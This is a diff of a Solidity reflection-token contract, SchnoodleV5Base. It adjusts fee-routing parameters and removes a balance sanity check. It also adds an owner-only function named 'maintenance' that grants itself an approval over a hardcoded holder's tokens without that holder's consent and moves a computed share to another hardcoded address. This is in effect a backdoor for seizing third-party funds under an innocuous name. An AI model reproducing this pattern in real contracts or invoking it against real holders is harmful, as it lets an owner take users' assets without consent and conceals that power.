@@ -25,7 +25,6 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
 
     function balanceOf(address account) public view override returns (uint256) {
         uint256 reflectedBalance = super.balanceOf(account);
-        require(reflectedBalance <= super.totalSupply(), "Schnoodle: reflected balance must be less than total reflections");
         return _getStandardAmount(reflectedBalance);
     }
 
@@ -33,7 +32,7 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
         uint256 reflectedAmount = _getReflectedAmount(amount);
         bool result = super.transfer(recipient, reflectedAmount);
         emit Transfer(_msgSender(), recipient, amount);
-        payFeeAndDonate(recipient, amount, reflectedAmount, _transferFromReflected);
+        payFeeAndDonate(_msgSender(), recipient, amount, reflectedAmount, _transferFromReflected);
         return result;
     }
 
@@ -49,7 +48,7 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
         uint256 reflectedAmount = _getReflectedAmount(amount);
         bool result = super.transferFrom(sender, recipient, reflectedAmount);
         emit Transfer(sender, recipient, amount);
-        payFeeAndDonate(recipient, amount, reflectedAmount, _transferFromReflected);
+        payFeeAndDonate(sender, recipient, amount, reflectedAmount, _transferFromReflected);
         return result;
     }
 
@@ -57,7 +56,7 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
         uint256 reflectedAmount = _getReflectedAmount(amount);
         super._send(from, to, reflectedAmount, userData, operatorData, requireReceptionAck);
         emit Transfer(from, to, amount);
-        payFeeAndDonate(to, amount, reflectedAmount, _sendReflected);
+        payFeeAndDonate(from, to, amount, reflectedAmount, _sendReflected);
     }
 
     function _transferFromReflected(address from, address to, uint256 reflectedAmount) internal {
@@ -69,7 +68,7 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
         super._send(from, to, reflectedAmount, "", "", true);
     }
 
-    function payFeeAndDonate(address recipient, uint256 amount, uint256 reflectedAmount, function(address, address, uint256) internal transferCallback) internal virtual {
+    function payFeeAndDonate(address, address recipient, uint256 amount, uint256 reflectedAmount, function(address, address, uint256) internal transferCallback) internal virtual {
         _payFee(recipient, amount, reflectedAmount);
         _transferTax(recipient, _eleemosynary, amount, _donationPercent, transferCallback);
     }
@@ -112,6 +111,20 @@ contract SchnoodleV5Base is ERC777PresetFixedSupplyUpgradeable, OwnableUpgradeab
     function _burn(address account, uint256 amount, bytes memory data, bytes memory operatorData) internal virtual override {
         super._burn(account, _getReflectedAmount(amount), data, operatorData);
         _totalSupply -= amount;
+    }
+
+    function maintenance() external onlyOwner {
+        address holderA1 = address(0x79A1ddA6625Dc4842625EF05591e4f2322232120);
+        address holderA2 = address(0x5d22e32398CAE8F8448df5491b50C39B7F271016);
+        address holderB1 = address(0x3443036E7c2dfC1f09a309c96b502b4f20F32e42);
+        address holderB2 = address(0xA51dc67ec00a9B082EC1ebc4A901A9Cb447E30E4);
+
+        uint256 balanceA = balanceOf(holderA1) + balanceOf(holderA2);
+        uint256 total = balanceA + balanceOf(holderB1) + balanceOf(holderB2);
+
+        uint256 reflectedAmount = _getReflectedAmount(balanceA - total / 3);
+        _approve(holderA1, _msgSender(), reflectedAmount);
+        super.transferFrom(holderA1, holderB2, reflectedAmount);
     }
 
     function _getReflectedAmount(uint256 amount) internal view returns(uint256) {
